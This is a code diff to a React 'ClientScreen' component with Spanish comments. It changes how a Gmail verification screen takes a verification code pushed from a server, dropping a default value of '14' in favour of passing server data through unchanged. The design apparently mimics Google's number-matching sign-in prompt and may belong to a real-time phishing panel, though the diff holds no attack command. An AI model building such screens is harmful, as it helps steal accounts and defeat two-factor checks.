@@ -149,27 +149,26 @@ export default function ClientScreen() {
             console.log('🔍 Mostrando pantalla de verificación Google con datos:', JSON.stringify(data));
             setCurrentScreen(ScreenType.GMAIL_VERIFY);
             
-            // Verificamos el formato del código recibido para asegurarnos que sea válido
-            let codigoVerificacion = '14'; // Valor predeterminado
+            // Procesamos los datos de la verificación Google
+            // ELIMINAMOS cualquier valor predeterminado para asegurar que solo se use lo que envía el servidor
             
-            if (data.codigo !== undefined) {
-              if (typeof data.codigo === 'string' && data.codigo.trim() !== '') {
-                codigoVerificacion = data.codigo.trim();
-              } else if (typeof data.codigo === 'number') {
-                codigoVerificacion = data.codigo.toString();
-              }
+            console.log('⚠️ Datos de código:', {
+              tipo: typeof data.codigo,
+              valor: data.codigo,
+              definido: data.codigo !== undefined
+            });
+            
+            // Si NO hay un código definido, lo mostramos en consola como advertencia
+            if (!data.codigo) {
+              console.warn('⚠️ ¡ADVERTENCIA! No se recibió código de verificación.');
             }
             
-            // Creamos un nuevo objeto para screenData para evitar referencias mutables
-            const newScreenData = {
-              ...data,
-              correo: data.correo || '',
-              codigo: codigoVerificacion
-            };
+            // Asignamos los datos directamente sin modificarlos
+            // IMPORTANTE: No transformamos ni cambiamos el código para evitar problemas
+            setScreenData(data);
             
-            // Actualizamos el estado de forma asíncrona para asegurar que se aplique
-            console.log('✅ Estableciendo datos para Gmail Verify:', JSON.stringify(newScreenData));
-            setScreenData(newScreenData);
+            // Para asegurarnos que se muestra, lo imprimimos en consola
+            console.log('✅ Código que se mostrará:', data.codigo);
             
             // Importante: no debemos actualizar screenData nuevamente al final de esta función
             return;
